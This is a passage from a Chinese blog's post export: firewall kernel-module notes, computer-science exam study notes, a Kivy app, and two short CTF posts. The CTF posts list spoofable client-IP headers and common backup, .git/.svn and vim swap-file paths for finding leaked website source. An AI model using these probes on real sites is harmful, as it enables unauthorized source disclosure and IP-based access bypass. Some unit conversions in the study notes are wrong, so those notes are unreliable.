{"pages":[],"posts":[{"title":"A Simple Packet Filtering Firewall in Linux(Linux下的包过滤防火墙)","text":"该防火墙通过 Linux内核模块LKM的C语言来编写的防火墙使用 Python写用户态下的界面Python与C结合来实现对防火墙进行配置源码地址: https://github.com/CSHF-yhhhh/A-Simple-Packet-Filtering-Firewall-in-Linux 准备工作 查看是否安装 linux-headers1ls -l /usr/src/linux-headers-$(uname -r) 如果不存在该目录,则安装:123sudo apt updateapt search linux-headers-$(uname -r)sudo apt install linux-headers-$(uname -r) 了解内核模块https://en.wikipedia.org/wiki/Loadable_kernel_module 了解 Netfilterhttps://en.wikipedia.org/wiki/Netfilter 接下来讲的是部分实现防火墙的原理,如果对原理不感兴趣只想直接运行的话, 点这里跳到代码运行介绍 编写一个简单的防火墙防火墙拦截数据包在包过滤防火墙中,最重要的就是把数据包拦截下来,钩子函数就是完成这一功能的函数,接下来介绍一下钩子函数 钩子函数的介绍钩子函数需要我们自己编写, 拦截到数据包后, 在函数中进行处理, 并处理数据包(通过返回值) 钩子函数的参数介绍123456789101112typedef unsigned int nf_hookfn(unsigned int hooknum, struct sk_buff *skb, const struct net_device *in, const struct net_device *out, int (*okfn)(struct sk_buff *));/*hooknum:钩子被记录的点skb:指向包含数据包信息的结构体的指针in:输入网络接口out:输出网口最后一个形参:指向一个由netfilter本身调用的函数的指针，在所有钩子完成之后，钩子函数通常不会调用它，因为这会导致其他钩子不能完成它们的工作。*/ 数据包的接收点(拦截点) 接收点 描述 NF_IP_PRE_ROUTING 收到数据包后 NF_IP_LOCAL_IN 发送到网络栈的数据包 NF_IP_FORWARD 要被转发的数据包 NF_IP_POST_ROUTING 已经经过路由准备发送的包 NF_IP_LOCAL_OUT 来自本机网络栈的数据包 钩子函数处理包的方法钩子函数通过 return 以下值中的一个来处理包 值 描述 NF_DROP 丢弃数据包 NF_ACCEPT 接受数据包 NF_STOLEN 钩子窃取数据包 NF_QUEUE 将数据包排队到用户空间 NF_REPEAT 重复钩子函数 注册钩子函数12345678910111213141516171819202122232425262728293031323334//nf_hook_ops结构体struct nf_hook_ops { struct list_head list; /* User fills in from here down. */ nf_hookfn *hook; struct module *owner; u_int8_t pf; unsigned int hooknum; /* Hooks are ordered in ascending priority. */ int priority;};/*hook: 处理包的钩子函数owner: 表示该函数在其中定义和注册的模块。pf: 指定想要接收声明类型的数据包hooknum: 钩子被记录的点priority: 优先级 priority 可选字段 NF_IP_PRI_FIRST = INT_MIN NF_IP_PRI_CONNTRACK_DEFRAG = -400 NF_IP_PRI_RAW = -300 NF_IP_PRI_SELINUX_FIRST = -225 NF_IP_PRI_CONNTRACK = -200 NF_IP_PRI_MANGLE = -150 NF_IP_PRI_NAT_DST = -100 NF_IP_PRI_FILTER = 0 NF_IP_PRI_SECURITY = 50 NF_IP_PRI_NAT_SRC = 100 NF_IP_PRI_SELINUX_LAST = 225 NF_IP_PRI_CONNTRACK_CONFIRM = INT_MAX NF_IP_PRI_LAST = INT_MAX*/ 注册完钩子函数后, 即可使用, 更多细节可以阅读 firewall.c 中源码的注释 部署防火墙以下提到的命令都最好都在代码所在目录用root下执行 测试时所用的环境Ubuntu 18.04 gcc version 7.5.0 python 3.6.9 测试防火墙切换到代码所在目录下 防火墙的启动1. 生成内核模块1make make 可能会有一些warning,这些没太大问题,如果有强迫症的话可以自己去改一下 2. 加载内核模块1insmod firewall.ko 执行这条命令后, 如果没有任何提示,则防火墙可能加载成功 3. 信息查看查看所有已加载的模块,如果能找到firewall及表示加载成功 1lsmod 查看防火墙模块信息 1modinfo firewall.ko 持续监听内核日志, 该命令使用 Ctrl + C 结束 1journalctl -f 防火墙的操作 PS: 其实在make之后, 就可以通过该界面来配置防火墙,包括防火墙的启动与停止,前提是要以root的身份来执行所以使用该模块的前提就是make成功 启动防火墙的配置界面1python3 page.py 启动后界面如下:通过界面操作, 即可配置防火墙的过滤规则 怎么使用就自己取摸索吧, 如果有Bug可以给我留言,有空我就会取修改 (¬‿¬)","link":"/A-Simple-Packet-Filtering-Firewall-in-Linux/"},{"title":"计算机组成原理——计算机系统概述","text":"计算机组成原理——计算机系统概述 目录 硬件的发展 数据大小 冯诺依曼机 特点（考点） 现代计算机 基本硬件 存储器:存放数据和程序 CPU CPU 的计算题（重要） 常见表示方法 性能指标 存储器的容量计算 系统整体 数据的存储方式和排列 存储程序原理 硬件的发展 第一代: 电子管时代 第二代: 晶体管时代 第三代: 中小规模集成电路时代 第四代: 大规模,超大规模集成电路时代 现代系列机指令系统不向后兼容 数据大小 比特:bit,也叫一位,也可以叫 b 字节:byte,等于 8bit 1B=8bit 字:word,一般等于 16bit,两个字节(由机器的硬件决定) 双字:dword,等于 32bit,4 个字节 冯诺依曼机首次提出 存储程序 概念 特点(考点) 计算机由五大部件组成(运算器,存储器,控制器,输入设备,输出设备) 指令和数据以同等地位存储在存储器中(可按地址寻访) 指令和数据用二进制表示 指令由操作码和地址码组成 存储程序 以运算器为中心(导致数据处理变慢) 区分指令与数据的依据指令周期的不同阶段 工作方式控制流驱动方式 现代计算机以存储器为中心 基本硬件 输入设备: 将信息转换成机器能识别的形式 输出设备: 将结果转换成人们收悉的形式 存储器: 存放数据和程序 注: 现代计算机的 MAR 与 MDR 一般在存储器中, 而不再 CPU 中CPU 中的指令寄存器(IR)和存储器中的 MAR,MDR 对用户完全透明(不可见) 存储体: 存放数据 存储单元: 每个存储单元存放一串二进制码 存储字: 存储单元中二进制代码的组合 存储字长: 存储单元中二进制代码的位数 存储元: 存储一个二进制位(1bit) MAR(地址寄存器): 存储数据地址 MAR 位数反应存储单元的个数 如 MAR 有 4 位,则对应 16 个存储单元(可以表示 6 个地址) MDR(数据寄存器): 存储由 MAR 获得的数据 MDR 位数等于存储字长 如 MDR 有 16 位,则可以存放一个字(word)(16bit)的信息 相联存储器即可按地址寻找,也可按内容寻址 CPUCPU 是指利用大规模集成电路计算把计算机的运算部件和控制部件做在一块集成电路的芯片CPU 中包括运算器 控制器 和 寄存器 运算器: 算术运算 逻辑运算 ACC: 累加器 MQ: 乘商寄存器 x: 通用的操作数寄存器 ALU: 算术逻辑单元 控制器: 指挥各部件 CU: 控制单元, 给出控制信号 IR: 指令寄存器,存放当前执行的指令 PC: 程序计数器,存放下一条指令地址(取址后自动加 1) 寄存器 地址寄存器 指令寄存器(IR) 通用寄存器 CPU 内部用于整数运算的运算器和通用寄存器的位数等于机器字长指令字长=存储字长(MDR)=机器字长 CPU 的计算题(重要) 时钟周期: 单位 微妙 纳秒 $CPU主频(时间频率)=\\frac{1}{CPU的时钟周期}$,单位赫兹(Hz) CPI: 指令执行所需的时钟周期数量 IPS: $每秒执行多少条指令=\\frac{主频}{平均CPI}$ FLOPS: 每秒钟可以执行多少次浮点运算 一般使用 IPS 标志系统性能 最小时间单位是时钟周期 常说的运算速度就是指 CPI 这里常考计算,因此要注意$程序的运行时间=\\frac{指令数量}{IPS}$ ,有时题目会挖坑改变 CPI,因此要注意转换问题 &gt; $1G=10^3M=10^6K=10^9$, 用来表示$Hz, IPS, FLOPS$, 如$MHz, MIPS$ &gt; $1MHz=1\\mu s, 1Hz=1ms$ 两个芯片片内逻辑相同=两个芯片的 CPI 相同 常见表示方法 寄存器名: 表示地址 (寄存器名): 表示寄存器的值 M: 表示存储器 性能指标 存储器的容量计算 设 MAR 的位数位为$a$MDR 的位数为$b$则 $存储器的总容量=2^a*b(bit)$ 系统整体 数据通路带宽数据总线一次传送信息的位数 吞吐量: 系统在单位时间内处理请求的数量 响应时间: 指用户向计算机发送一个请求,到系统对该请求做出响应所需要的等待时间 数据的存储方式和排列 大端模式(最高有效字节 MSB)(便于人阅读)最高有效字节存放在低地址,最低有效字节存放在高地址部分 小端模式(最低有效字节 LSB)(便于机器使用)最高有效字节存放在高地址, 最低有效字节存放在低地址部分 边界对齐计算机每次访存只能读/写 1 个字,边界对齐牺牲部分空间,来提高访存效率(如果一个变量的存放位置在两个字直接,就要访存 2 次才能读取完,采用边界对齐的方式,可以减少这样的情况发生) 存储程序原理存储程序是将指令以代码的形式先输入计算机主存储器, 然后按其在存储器中的首地址执行程序的第一条指令, 以后就按该程序的规定顺序执行其他指令, 直至程序结束 计算机按照此原理具有以下功能 1. 数据传送功能 2. 数据存储功能 3. 数据处理功能 4. 操作控制功能 5. 操作判断功能","link":"/COP-COP-1/"},{"title":"数据结构——基础知识","text":"数据结构复习笔记 基本概念 数据信息的载体 数据元素数据的基本单位,由若干个数据组成 数据对象相同性质的数据元素集合 数据类型值的集合和对集合的操作 1.原子类型: 不可再分 2.结构类型: 值可以再分解成若干数据类型 3.抽象数据类型: 组织与之相关的操作(可以用来定义一个完整的数据结构) 数据结构 相互之间存在一种多多种特定关系的数据元素集合 数据结构独立于其存储结构 逻辑结构- 线性结构 一般线性表 受限线性表: 栈、队列、串 - 线性表推广 线性表推广: 数组 非线性结构 集合 树: 一般树、二叉树 图: 有向图、无向图 存储结构 顺序存储 逻辑上相邻的元素物理位置也相邻 优点 ① 随机存取;② 每个元素占用最少的存储空间 缺点 只能使用相邻的存储单元, 可能产生较多的外部碎片 链式存储 逻辑上相邻的元素物理位置上不一定相邻, 使用元素存储地址指针表示逻辑关系 优点 不会出现碎片现象, 能充分利用所有存储单元 缺点 ① 存储会占用额外的存储空间; ② 只能顺序存储 索引存储 在存储元素信息和索引表(索引表每项称为索引项) 优点 检索速度快 缺点 ① 索引表占用额外存储空间; ② 增删数据时,需要花费额外时间修改索引表 散列存储(哈希存储) 根据元素关键字直接计算出元素的存储地址 优点 检索、增加、删除结点的操作快 缺点 对散列函数要求高， 若散列函数有缺点，会出现元素存储单元冲突，为解决冲突而增加时间和空间开销的问题 时间/空间复杂度 常见的时间复杂度$O(1) &lt; O(\\log_2n) &lt; O(n\\log_2n) &lt; O(n^2) &lt; O(n^3) &lt; O(2^n) &lt; O(n!) &lt; O(n^n)$ 齐次线性递推关系 $$T(n) = \\begin{cases}1, n=1,2\\aT(n-1) + bT(n-2)\\\\end{cases}$$ 主要计算$$T(n) = T(n-1) + T(n-2)\\quad ①$$ $①式$为二阶线性常系数齐次差分方程$$X_{k+2} = AX_{K+1}+bX_K \\quad ②$$其中$a^2+4b\\not=0$如果等比数列 $\\lambda^k$ 是$②式$的解,则有$$\\lambda^2-a\\lambda-b=0\\quad ③$$解$③式$得$\\lambda_1,\\lambda_2$, 且$X_k=C_1\\lambda_1^k+C_2\\lambda_2^k \\quad ④$可将特解(如$k=1,2$)带入$④式$中得到$C_1,C_2$ 主定理主定理适用于如下表达式$$f(n)=af(\\frac{n}{b}) + g(n)$$计算主定理类型的时间复杂度的方法为:$n^{\\log_ba}$ 与 $g(n)$ 比阶, 则$$T(n)=\\begin{cases}n^{\\log_ba} \\ \\ \\quad\\quad \\quad n^{\\log_ba} &gt; g(n)\\\\g(n) \\quad \\quad \\quad \\quad n^{\\log_ba} &lt; g(n)\\\\n^{\\log_ba}\\log_2n \\quad n^{\\log_ba} = g(n)\\\\\\end{cases}$$","link":"/DataStructure-1/"},{"title":"计算机组成原理——指令系统","text":"计算机组成原理——指令系统 目录 指令格式 按指令格式分类 按指令长度分类 按操作码长度分类 按操作类型分类 扩展操作码 指令寻址 数据寻址 直接寻址 间接寻址 寄存器寻址 寄存器间接寻址 隐含寻址 立即寻址 基址寻址 变址寻址 相对寻址 堆栈寻址 总结 CISC 和 RISC CISC RISC 对比 指令格式 若计算机按字节编址, 则任何地址位数都要是 8 的倍数同理, 按字编址则根据字长来确定地址长度不同长度的指令,取址操作可以不同 由操作码和地址码组成 按指令格式分类 零地址指令OP 不需要操作数, 如空操作,停机, 关中断等 堆栈计算机, 操作数隐含存放在栈顶,结果压回栈顶 一地址指令OP(A), A表示操作数地址 (A)表示地址中的内容 只需要单操作数, 如加 1, 减 1, 取反, 求补等, 并将结果存回操作数(完成一次需要 3 次访存)([取址]–&gt;[读 A]–&gt;[写 A]) 需要两个操作数, 另一个操作数隐含在寄存器中 二地址指令OP(A1)(A2) ,其中A1为目的操作数, A2为源操作数将操作结果写道目的操作数A1需要访存 4 次([取址]–&gt;[读 A1]–&gt;[读 A2]–&gt;[写 A1]) 三地址指令OP(A1)(A2)(A3), 将对A1,A2的操作结果写入A3需要访存 4 次([取址]–&gt;[读 A1]–&gt;[读 A2]–&gt;[写 A3]) 四地址指令OP(A1)(A2)(A3), 将对A1,A2的操作结果写入A3, A4为下一条将要执行的指令地址, 将 PC 的值修改为A4指向的地址需要访存 4 次([取址]–&gt;[读 A1]–&gt;[读 A2]–&gt;[写 A3]) 按指令长度分类 定长指令字结构指令系统中所有指令长度相等 变长指令字结构指令系统中各指令的长度不等 按操作码长度分类 定长操作码指令系统中所有指令的操作码长度都相同控制器的译码电路设计简单, 灵活性低 可变长操作码指令系统中各指令的操作码长度可变控制器的译码电路设计复杂, 但是更灵活 按操作类型分类 数据传送指令把寄存器(存储器)中的数据放到存储器(寄存器) 运算类指令 算数逻辑指令如加减乘除,与或非等 移位操作算数移位, 逻辑移位, 循环移位等 程序控制类指令程序执行流的改变语句等 输入输出指令CPU 寄存器与 IO 端口之间的数据传送 扩展操作码定长指令格式+可变长操作码=扩展操作码指令格式 例如在 16 位指令字长的计算机中, 每个地址码占 4 位 3 地址指令中,高 4 位分别表示指令$1,2\\dots 15, 即 0001_2, 0010_2 \\dots 1110_2$, 而$1111_2$表用来表示该地址为 2 地址指令 同理, 在二地址指令中, 高 4 为全为 1, 次高 4 的$1,2\\dots 15, 即 0001_2, 0010_2 \\dots 1110_2$用来表示 15 条二地址指令, $1111_2$表用来表示该地址为 1 地址指令 以此类推… 设计扩展操作码的注意事项 不允许短码是长码的前缀, 即短操作码不能与长操作码前面的部分相同 各指令的操作码不能重复 注: 对于使用频率高的指令可以分配较端的操作码, 减少指令译码和分析的时间 优点在指令字长有限的前提下仍保持比较丰富的指令种类 缺点增加了指令译码器和分析的难度, 使控制器的设计复杂 指令寻址确定下一条指令的存放地址在取完指令后一定会 PC+1, 指向下一条要执行的语句 下一条要执行的指令地址始终在 PC 中按字编址: 即一个存储字长为一个地址按字节编址: 一个字节为一个地址PC+1 指的是$PC当前地址+每条指令的长度/机器编址长度$ 顺序寻址 使用定长指令结构,主存字节编址$a(bit)=指令字长=存储字长$则每次 PC 的值加$\\frac{a}{8}$ 使用变长指令结构, 主存按字节编址 读入一个字, 根据操作码 pan’d 这条指令的总字节数 n (PC) = (PC) + n 跳跃寻找在遇到 JMP 等转移指令时, 会修改 PC 的值 数据寻址确定当前正在运行的指令的地址码指明的真实地址在地址前面加上寻址特征标识用哪种方式来寻址,将被标识的地址成为形式地址(A), 真实地址记为 EA 直接寻址EA=A 形式地址就是操作数的真实地址 优点实现简单, 指令执行阶段只访问一次主存, 不需要专门计算操作数地址 缺点操作数不易修改 间接寻址EA = (A) 形式地址存储的数据是操作数的有效地址(而不是操作数的值) 指令的执行取指令访存 1 次, 执行指令访存 2 次(如不考虑存储结果) 优点可扩大寻址范围(有效地址 EA 的位数大于形式地址 A 的位数)便于编制程序(方便子程序返回) 缺点 指令在执行阶段要多次访存(一次间接寻址需两次访存) 寄存器寻址EA=R 操作数为寄存器所在的编号, 操作数在R所指的寄存器内 指令的执行取址访存一次, 执行指令不需要访存 优点指令在执行阶段不访问主存,只访问寄存器指令字短且执行速度快,支持向量/矩阵运算 缺点寄存器个数有限 寄存器间接寻址EA=(R) 寄存器中存的是操作数所在地址 指令的执行取址令访存一次, 执行指令访存一次 优点与一般间接寻址比速度更快 缺点指令执行的阶段需要访问主存 隐含寻址操作数的地址不明显, 在指令中隐含着操作数的地址 优点有利于缩短指令字长 缺点需增加存储操作数或隐含地址的硬件 立即寻址形式地址就是操作数本身, 一般采用补码形式 执行执行只需在取指令的时候访存一次 优点指令执行阶段不访问主存, 指令执行时间最短 缺点 A 的位数限制了立即数的范围 基址寻址EA=(BR)+A 以程序的起始存放地址为起点 将CPU中基址寄存器(BR)的内容加上指令中的形式地址A形成的有效地址 (或者在指令中指明将哪个寄存器作为基址寄存器) (BR作为基地址, A作为偏移量) 基址寄存器的内容由操作系统管理 优点可以扩大指令的寻址范围用户不必考虑程序存于主存的哪一位置有利于多道程序设计, 可用于编制浮动程序 变址寻址EX=(IX)+A 程序员决定起点的位置 有效地址等于形式地址与变址寄存器IX的内容相加 (也可以用通用寄存器作为变址寄存器) 编制寄存器是面向用户, 程序执行过程中, 变址寄存器的内容可以由用户改变 (A作为基地址, IX作为偏移量) 优点在数组处理过程中, 可以设定 A 为数组的首地址, 不断改变变址寄存器 IX 的内容,便可轻松的形成数组中任意 ui 数据的地址, 特别适合编制循环程序 变址间指寻址EX=((IX)+A) 相当于将变址寻址得到的地址中的值取出来作为地址 相对寻址EA=(PC)+A(A用补码表示) 以程序计数器PC所指的地址为起点 把程序计数器的内容加上形式地址A(A为下一条地址的偏移量) 优点 代码在程序内浮动时, 不用更改跳转指令的地址,广泛用于转移指令 堆栈寻址操作数存放在堆栈中, 隐含使用堆栈指针(SP)作为操作数地址 硬堆栈: 使用寄存器软堆栈: 在主存中 总结 寻址方式 有效地址 访存次数 直接寻址 EA=A 1 间接寻址 EA=(A) 2 寄存器寻址 EA=R 0 寄存器间接寻址 EA=(R) 1 隐含寻址 程序指定 0 立即寻址 A 为操作数 0 基址寻址 EA=(BR)+A 1 变址寻址 EX=(IX)+A 1 相对寻址 EA=(PC)+A 1 堆栈寻址 入栈\\出栈时 EA 的确定方式不同 硬堆栈不访存,软堆栈访存 1 次 CISC 和 RISC CISC 设计思路一条指令完成一个复杂的基本功能 80-20 规律典型程序中 80%的语句使用处理机中 05 的指令 特点一条指令有一个专门的电路完成, 有的复杂指令用纯硬件难以实现采用 存储程序的设计思想, 由一个比较通用的电路配合存储部件完成一条指令 RISC 设计思路一条指令完成一个基本动作多条指令组合完成一个复杂的基本功能一条指令对应一个电路, 电路设计相对简单,功耗更低 对比 名称 CISC RISC 指令系统 复杂, 庞大 简单, 精简 指令数目 一般大于 200 条 一般小于 100 条 指令字长 不固定 定长 可访存指令 不加限制 只有 Load\\Store 指令 各种指令的执行时间 相差较大 绝大多数在一个周期内完成 各种指令使用频率 相差很大 都比较常用 通用寄存器数量 较少 多 目标代码 难以用优化编译器生成高效的目标代码 采用优化的编译程序,生成代码较为高效 控制方式 绝大多数可为微程序控制器 绝大多数为组合逻辑控制 指令流水线 可以通过一定方式实现 必须实现","link":"/COP-COP-4/"},{"title":"计算机组成原理——常见概念的总结","text":"计算机组成原理中一些常见常见概念的总结 名词总结字长 地址空间地址有多少位就有多少个线性空间 存储字长存放在一个存储单元中的二进制代码位数, 等于 MDR 的位数 数据字长数据总线一次能并行传送的位数 机器字长CPU 进行一次整数运算所能处理的二进制数据的位数(通常与 ALU 之间相关) 指令字长一条指令的总长度(可能会变) 半字长指令, 单字长指令, 双字长指令指的是指令长度是机器字长的多少倍 机器字长决定计算机精度 机器字长=CPU 内部用于整数运算的运算器和通用寄存器的位数 指令字长=存储字长(MDR)=机器字长 周期相关的名词 CPU 时钟周期(节拍)CPU 中最小的时间单位 主频(CPU 的时钟频率)(单位 Hz)$CPU时钟周期=\\frac{1}{主频}$ 1Hz 表示每秒 机器周期 完成一个基本操作所需要的时间(等于若干个时钟周期) 指令周期 CPU从主存取出并执行一条指令的时间(等于若干个机器周期) 性能及计算总结数据通路带宽,吞吐量,响应时间 数据通路带宽: 数据总线一次传送信息的位数 吞吐量: 系统在单位时间内处理请求的数量 响应时间: 指用户向计算机发送一个请求,到系统对该请求做出响应所需要的等待时间 一般使用吞吐量来评价计算机系统的综合性能 存储器相关名词查看详情 MDR(数据寄存器) MAR(地址寄存器)设 MAR 有 n 位, 则表示该存储体有$2^n$个存储单元 编址方式 按字编址每个字(字长)为一个存储单元 按字节编址每8bit为一个存储单元 存储单元每个存储单元存放一串二进制码 存储字存储单元中二进制代码的组合 存储字长存储单元中二进制代码的位数(一般与 MDR 的位数一致) 存储元存储一个二进制位(1bit) 存取时间启动一次存储器操作到完成该操作的时间 包括读出时间和写入时间 存取周期 也称为读写周期或访问周期 存储器进行一次完整的读写操作所需的时间 $存取周期=存取时间+恢复时间$ $存储器容量=2^{MAR的位数} \\times MDR的位数 (单位: 位)$ CPU 相关名词CPU 性能查看详情 CPI执行一条指令所需的时钟周期数量 CPU 执行时间允许一个程序所花费的时间$CPU执行时间=\\frac{CPU时钟周期数}{主频}$$CPU执行时间=\\frac{指令条数 \\times CPI}{主频}$ IPS$每秒执行多少条指令=\\frac{主频}{平均CPI}$ FLOPS每秒钟可以执行多少次浮点运算 $平均指令周期=\\frac{1}{IPS}(单位由IPS决定)$ 一般使用 IPS 标志系统性能 最小时间单位是时钟周期 常说的运算速度就是指 CPI 这里常考计算,因此要注意$程序的运行时间=\\frac{指令数量}{IPS}$ ,有时题目会挖坑改变 CPI,因此要注意转换问题 &gt; $1G=10^3M=10^6K=10^9$, 用来表示$Hz, IPS, FLOPS$, 如$MHz, MIPS$ &gt; $1MHz=1\\mu s, 1Hz=1ms$ 两个芯片片内逻辑相同=两个芯片的 CPI 相同 CPU结构查看详情 运算器 对数据加工处理 算术逻辑单元(ALU) 进行算数逻辑运算 通用寄存器组 存放操作数和各种地址信息等 暂存寄存器 用于暂存从主存读来的数据 累加寄存器(ACC) 用于暂时存放 ALU 的运算结果 程序状态字寄存器(PSW) 保留由算术逻辑运算指令或测试指令的结果(溢出标志, 符号标志, 零标志等) 移位器 对运算结果进行移位运算 计数器 控制乘除运算的操作步骤 控制器 控制功能部件协调工作 控制单元(CU) 分析指令, 给出控制信号 指令寄存器(IR) 存放当前执行的指令 指令译码器 对操作码译码, 向控制器提供操作信号 程序计数器(PC) 存放下一条指令地址, 有自动加 1 功能 微操作信号发生器 产生控制整个计算机系统所需的各种控制信号 时序系统 产生各种时序信号(由统一时钟分频得到) 存储器地址寄存器(MAR) 存放所要访问的主存单元的地址 存储器数据寄存器(MDR) 存放向主存写入的信息或者从主存读出的信息","link":"/COP-COP-WORDS/"},{"title":"HTTP更改客户端IP的方式","text":"HTTP头 描述 对应PHP字段 X-Forwarded-For 用户是在哪个IP使用的代理（有可能存在，也可以伪造） $_SERVER[‘HTTP_X_FORWARDED_FOR’] X-Remote-Addr 访问端（有可能是用户，有可能是代理的）IP $_SERVER[‘REMOTE_ADDR’] X-Client-IP 用户是在哪个IP使用的代理（有可能存在，也可以伪造） $_SERVER[‘HTTP_CLIENT_IP’]","link":"/CTF-ChangeHttpClientIP/"},{"title":"基于 Kivy&#x2F;Kivymd 开发的成语学习APP","text":"本项目已成功打包,使用的打包环境请参考nkiiiid的文章buildozer.spec文件请参考/MainApp/buildozer.spec项目和成功成功打包的APK已上传至github ,可自行下载 环境说明 Kivy==1.11.1kivy-deps.glew==0.3.0kivy-deps.gstreamer==0.3.1kivy-deps.sdl2==0.3.1Kivy-Garden==0.1.4kivymd==0.104.1Django==3.1openpyxl==3.0.6 本地运行 server服务端 服务端使用Diango框架,通过json来传输数据 12#如果需要部署在服务器上记得在服务器中开放使用的端口python ./server/manage.py runserver ip:port #eg: python manage.py 0.0.0.0:12345 MainApp/client/client.py 在这个文件夹中设置服务器的地址和端口 启动app 在MainApp下,通过以下命令运行 1python main.py","link":"/Kivy-Kivy-Kivymd-Learn-APP/"},{"title":"网站信息泄露","text":"常见的网站源码泄露 备份常见备份文件名 1234567webwebsitebackupbackwwwwwwroottemp 备份文件的后缀 1234tartar.gzziprar 使用文件名与后缀的组合来测试是否有备份文件 版本控制访问 12/.git/.svn VIM当我们在使用vim编辑的时候，vim会在被编辑文件同一目录下，创建一个名为filename.swp的文件，记录我们的动作，比如在编辑index.php的时候会存在一个index.php.swp的文件,可以访问改文件来查看源码有时也可能不需要加. 123.index.php.swp #第一次产生的交换文件.index.php.swo #第二次产生的交换文件.index.php.swn #第三次产生的交换文件 其他12/editor/tz.php","link":"/CTF-WebsiteInformationLeakage/"},{"title":"计算机网络——基础知识","text":"计算机网络基础知识 目录 考察目标 基础知识 计算机网络的概念 计算机网络的功能 计算机网络的发展 计算机网络的组成 功能组成 网络分类 按分布范围分 按使用者分 按交换技术分 按拓扑结构分 按传输技术分 标准化工作 标准的分类 RFC（因特尔标准的形式） 计算机网络的性能指标（重要） 速率 码元传输率 信息传输速率 带宽 吞吐量 时延 发送时延 传播时延 排队时延 处理时延 时延带宽积 往返时间 RTT 利用率 信道利用率 网络利用率 分层结构 分层的原则 OSI 参考模型 应用层 表示层 功能 会话层 功能 传输层 功能 网络层 功能 数据链路层 功能 物理层 功能 TCP/IP 参考模型 与 OSI 模型的相同点 与 OSI 模型的不同点 层参考模型 计算机体系结构是从功能上描述计算机网络结构 计算机体系结构称网络体系结构是分成结构 计算机网络体系结构是计算机网络的各层及协议的集合 体系结构是抽象的, 实现的是只能运行的一些具体软件 考察目标 掌握计算机网络的基本概念, 基本原理和基本方法 掌握计算机网络的体系结构和典型的网络协议, 了解典型网络设备的组成特点, 理解典型网络设备的工作原理 能够运用计算机网络的基本概念, 基本原理喝基本方法进行网络系统的分析,设计和应用 基础知识 计算机网络的概念 计算机网络是一个将分散的, 具有独立功能的计算机系统,通过通信设备与线路连接起来,由功能完善的软件实现资源共享和信息传递的系统 计算机网络是互联的.自治的计算机集合 互联: 通过通信链路互联互通自治: 无主从关系 计算机网络的功能 数据通信 资源共享 分布式处理 提高可靠性 负载均衡 计算机网络的发展 ARPAnet 阿帕网-&gt;internet 互联网-&gt;Internet 因特网 ARPAnet 阿帕网只能实现相同网络的互连 目前使用的就是 Internet 网络将多台计算机连接到一起, 互联网将多个网络连接在一起, 因特网是世界上最大的互联网 注意与互联网(internet)中 i 的大小写区别 三级结构 主干网 地区网 校园网/企业网 3 连接到 2, 2 连接到 1 多层次 ISP 结构分为主干 ISP, 地区 ISP 和本地 ISP ISP: 因特网服务提供者或因特尔服务提供商, 是一个向用户提供互联网接入业务, 信息业务和增值业务的公式(如中国移动,电信等) 计算机网络的组成 组成部分硬件,软件,协议 协议:一系列规则和约定的集合 工作方式 边缘部分用户使用 C/S 方式(客户/服务器)或 P2P 方式(对等连接,不存在客户与服务器之分,每台主机既可以为服务器, 也可以为客户) 核心部分为边缘部分提供服务 功能组成 通信子网实现数据通信,各种传输介质,通信设备,相应的网络协议组成 OSI 的下三层网络层: 路由器数据链路层: 交换机,网桥物理层: 集线器,中继器 资源子网实现资源共享/数据处理, 实现资源共享功能的设备和软件集合 OSI 的上 3 层 网络分类 按分布范围分 广域网(WAN)(交换技术)几十到几千公里, 因特网的核心部分, 跨国家 城域网(MAN)覆盖一个城市 局域网(LAN)(广播技术)如:一个学校或一个公司的范围 个人局域网(PAN)个人工作的地方,基本为 10m 左右 按使用者分 公用网 专用网 按交换技术分 电路交换有建立连接时延, 不使用存储转发, 因此在每个结点不存在转发时延 报文交换 分组交换将要发送的数据分组发送, 每个分组加上头部信息使用存储转发技术, 因此分组经过的结点都需要转发一次分组,有多个转发时延(计算分组交换时延时,需要注意) 分组数据的最佳大小计算设$D$为分组数据大小,$y$为开销字节总数(及发送全部分组需要添加的头部大小与全部重发分组头部大小), $a$为发送错误的分组数量, $b$为分组头部大小, $c$ 为总共要发送的数据大小 $$y=\\frac{b\\times c}{D} + D\\\\两边对D求导得: y’= 1 - \\frac{a \\times c}{D^2}\\\\令1 - \\frac{a \\times c}{D^2}=0,解得D即为分组数据得最佳大小$$ 按拓扑结构分 总线型 星型 设有 n 个结点,则有 n-1 条物理链路 环形 网状型 … 按传输技术分 广播式网络共享公告通信信道 点对点网络使用分组存储转发和路由选择机制 标准化工作 标准的分类 法定标准 事实标准 RFC(因特尔标准的形式) 因特网草案 建议标准 草案标准(2011 年取消了这个阶段) 因特网标准 相关组织国际标准化组织(ISO),国际电信联盟(ITU),电气和电子工程师协会(IEEE),Internet 工程任务组(IETF) 计算机网络的性能指标(重要) 1. 速率在计算机网络中,速率指数据率或数据传输率或比特率(比特是数据量的单位)速率就是连接在计算机网络上的主机在数字信道上传送数据位数的速率 码元传输率码元 也叫波特率, 码元速率, 波形速率, 调制速率, 符号速率 表示单位时间内传输的码元个数(脉冲个数或信号变化的次数)单位是 波特(Baud) 1 波特表示每秒传输 1 个码元 信息传输速率 别名信息速率, 比特率, 表示单位时间内传输的二进制码元的个数(比特数)单位是 比特/秒(b/s) 1 秒可以传输多少比特1 个码元携带$n$ bit 的信息, 且$M$ Baud 码元传输速对应的信息传输速率=$M \\times n$ bit/s 2. 带宽在数字设备中, 表示单位时间内从网络某一点到另一点所能通过的最高数据率(单位时间内通过链路的数据量) 在模拟信号系统中, 最高频和最低频的差值代表系统的通频带宽, 单位赫兹(Hz) 带宽现用来表示网络的通信链路传送数据的能力, 通常指单位时间内从网络中的某一点到另一点所能通过的最高数据率 也可以理解为是网络设备所支持的最高速度(将数据发送到链路上的发送速率)单位为 :b/s,kb/s, Mb/s,Gb/s 注意单位中的 b 为小写 3. 吞吐量用来表示在单位时间内通过某个网络(信道, 接口)的数据量吞吐量受网络的带宽或网络的额定速率的限制 所有链路速率之和为吞吐量 4. 时延数据(报文/分组/比特流)从网络或链路的一端传送到另一端所需的时间 发送时延发送分组的第一个比特算起,到该分组的最后一个比特发送所需的时间$$发送时延=\\frac{数据长度}{信道带宽(发送速率)}$$ 传播时延数据在信道上传播一定距离所花费的时间, 取决于电磁波传播速度(一般为$2\\times10^8m/s$)和链路长度$$传播时延=\\frac{信道长度}{电磁波在信道上的传播速率}$$ 排队时延等待输出/输入链路可用 处理时延检错和转发的时间 5. 时延带宽积 发送方在收到一个响应之前能够发送的数据量 某段链路现在又多少比特(以比特为单位的链路长度)(链路中的容量)$$时延带宽积(bit)=传播时延(s)\\times 带宽(bit/s)$$ 6. 往返时间 RTT RTT 越大, 在收到确认之前, 